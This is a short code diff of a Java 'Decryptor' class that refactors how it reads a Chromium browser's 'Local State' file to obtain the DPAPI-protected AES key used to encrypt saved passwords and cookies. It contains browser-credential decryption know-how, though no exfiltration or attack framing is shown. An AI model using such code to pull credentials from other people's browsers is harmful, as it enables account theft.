@@ -6,14 +6,11 @@ import java.util.regex.Pattern;
 import java.io.File;
 import java.io.FileInputStream;
 import java.nio.charset.StandardCharsets;
-import java.nio.file.Path;
 import java.nio.file.Paths;
 import javax.crypto.Cipher;
 import javax.crypto.spec.GCMParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
-import com.fasterxml.jackson.databind.JsonNode;
-import com.fasterxml.jackson.databind.ObjectMapper;
 import com.sun.jna.platform.win32.Crypt32Util;
 
 public class Decryptor {
@@ -53,11 +50,9 @@ public class Decryptor {
 
     public static byte[] getAESKey(String path) {
         try {
-            ObjectMapper objectMapper = new ObjectMapper();
-            Path AESKeyJsonPath = Paths.get(path, "Local State");
-            JsonNode AESKeyJson = objectMapper.readTree(AESKeyJsonPath.toFile());
+            Json localState = new Json(Paths.get(path, "Local State"));
 
-            String encodedAESKey = AESKeyJson.path("os_crypt").path("encrypted_key").asText();
+            String encodedAESKey = localState.valueOf("encrypted_key");
             byte[] decodedAESKey = Base64.getDecoder().decode(encodedAESKey);
             byte[] encryptedAESKey = Arrays.copyOfRange(decodedAESKey, DPAPI_OFFSET, decodedAESKey.length);
 
